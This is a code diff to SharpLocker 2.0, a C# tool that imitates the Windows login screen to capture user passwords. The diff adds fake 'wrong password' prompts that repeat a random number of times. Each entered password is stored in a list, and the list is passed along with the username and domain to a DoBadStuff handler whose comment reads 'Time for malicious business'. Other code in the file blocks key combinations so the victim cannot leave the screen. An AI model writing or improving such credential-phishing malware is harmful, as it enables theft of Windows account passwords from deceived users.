@@ -2,6 +2,7 @@
 using SharpLocker_2._0.Controls;
 using SharpLocker_2._0.Interfaces;
 using System;
+using System.Collections.Generic;
 using System.Data;
 using System.DirectoryServices.AccountManagement;
 using System.Drawing;
@@ -20,6 +21,10 @@ namespace SharpLocker_2._0
         private bool DenyClose { get; set; }
         private IDoBadStuff DoBadStuff;
         private Configuration Configuration { get; set; } = new Configuration();
+
+        private int PasswordErrors { get; set; }
+        private int PasswordErrorCounter { get; set; }
+        private List<string> ErrorPasswords { get; set; } = new List<string>();
 
         #endregion
 
@@ -57,6 +62,14 @@ namespace SharpLocker_2._0
             if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
             if (PasswordTextBox.Text == Configuration.PlaceholderText) return;
 
+            if (PasswordErrorCounter < PasswordErrors)
+            {
+                PasswordErrorCounter++;
+                ErrorPasswords.Add(PasswordTextBox.Text);
+                ShowPasswordError();
+                return;
+            }
+
             DenyClose = false;
 
             if (!Configuration.DebugMode) KeyPressHandler.Enable();
@@ -64,7 +77,7 @@ namespace SharpLocker_2._0
             try
             {
                 // Time for malicious business 😏
-                DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
+                DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName, ErrorPasswords);
             }
             catch (Exception ex)
             {
@@ -75,6 +88,28 @@ namespace SharpLocker_2._0
                 Close();
             }
 
+        }
+
+        private void ShowPasswordError()
+        {
+            SetPlaceholder();
+            ChangeVisiblityOfPasswordControls(true);
+        }
+
+        private void WrongPasswordButton_Click(object sender, EventArgs e)
+        {
+            ChangeVisiblityOfPasswordControls(false);
+        }
+
+        private void ChangeVisiblityOfPasswordControls(bool wrongPassword)
+        {
+            PasswordTextBox.Visible = !wrongPassword;
+            ShowPasswordButton.Visible = !wrongPassword;
+            LoginButton.Visible = !wrongPassword;
+            CapsLockLabel.Visible = !wrongPassword;
+
+            WrongPasswordLabel.Visible = wrongPassword;
+            WrongPasswordButton.Visible = wrongPassword;
         }
 
         #region "Password"
@@ -162,13 +197,14 @@ namespace SharpLocker_2._0
             InitializeConfiguration();
             InitializeMisc();
             InitializePasswordTextbox();
-            InitializeTaskbar();
+            InitializeKeyCombinations();
             InitializeUserLabel();
             InitializeUserIcon();
             InitializeBackground();
             InitializeBadStuff();
             InitializeOtherScreens();
             InitializeOtherUsers();
+            InitializePasswordErrors();
         }
 
         // Loads a setup from a dll file thats implements the ISetup interface
@@ -225,7 +261,7 @@ namespace SharpLocker_2._0
         }
 
         // disables certain key combinations in release builds
-        private void InitializeTaskbar()
+        private void InitializeKeyCombinations()
         {
             if (!Configuration.DebugMode) KeyPressHandler.Disable();
         }
@@ -351,7 +387,7 @@ namespace SharpLocker_2._0
         // draw a white border around the password text box
         private void WindowsLogin_Paint(object sender, PaintEventArgs e)
         {
-            int offset = 1;
+            int offset = 1; //TODO: hide borders
             e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                 PasswordTextBox.Location.X - offset,
                 PasswordTextBox.Location.Y - offset,
@@ -461,6 +497,13 @@ namespace SharpLocker_2._0
             p.Controls.Add(pb);
             p.Controls.Add(b);
             Controls.Add(p);
+        }
+
+        // sets the amount of needed password tries
+        private void InitializePasswordErrors()
+        {
+            PasswordErrors = new Random().Next(Configuration.MinPasswordErrors, Configuration.MaxPasswordErrors + 1);
+            PasswordErrorCounter = 0;
         }
 
     }
